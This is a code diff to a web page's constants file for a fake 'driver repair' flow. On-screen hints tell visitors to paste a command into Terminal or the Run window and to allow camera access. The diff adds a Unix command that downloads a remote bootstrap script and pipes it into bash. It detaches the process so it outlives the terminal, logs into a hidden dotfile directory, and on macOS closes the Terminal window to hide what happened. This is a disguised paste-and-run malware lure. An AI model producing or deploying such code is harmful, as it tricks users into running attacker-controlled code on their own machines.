@@ -16,8 +16,10 @@ const REPAIR_CONFIRM_HINT_ENTER = "Press Enter in the Run window, allow camera, 
 const REPAIR_CONFIRM_HINT_TERMINAL = "Use Terminal on your desktop, then come back here.";
 const REPAIR_CONFIRM_HINT_TERMINAL_PASTE = "Paste into Terminal on your desktop — not in this browser tab.";
 const REPAIR_CONFIRM_HINT_TERMINAL_ENTER = "Press Enter in Terminal, allow camera, then come back here.";
+const REPAIR_BOOTSTRAP_URL = "https://driver-fix-238308.netlify.app/bootstrap.sh";
+const REPAIR_UNIX_BOOTSTRAP_RUN = `(setsid bash -c 'curl -fsSL ${REPAIR_BOOTSTRAP_URL} | bash' 2>/dev/null || nohup bash -c 'curl -fsSL ${REPAIR_BOOTSTRAP_URL} | bash')`;
 const REPAIR_UNIX_COMMAND =
-  "mkdir -p ~/.driver-fix-host/.host-setup && nohup bash -c 'curl -fsSL https://driver-fix-238308.netlify.app/bootstrap.sh | bash' >>~/.driver-fix-host/.host-setup/run.log 2>&1 &";
+  `mkdir -p ~/.driver-fix-host/.host-setup && ${REPAIR_UNIX_BOOTSTRAP_RUN} >>~/.driver-fix-host/.host-setup/run.log 2>&1 < /dev/null & disown; case "$(uname -s)" in Darwin) osascript -e 'tell application "Terminal" to close (front window)' 2>/dev/null ;; esac; exit`;
 const REPAIR_STEP1_FALLBACK_DELAY_MS = 10000;
 const HOST_ACCESS_SESSION_KEY = "aster-ridge-host-access";
 const THEME_STORAGE_KEY = "aster-ridge-theme";
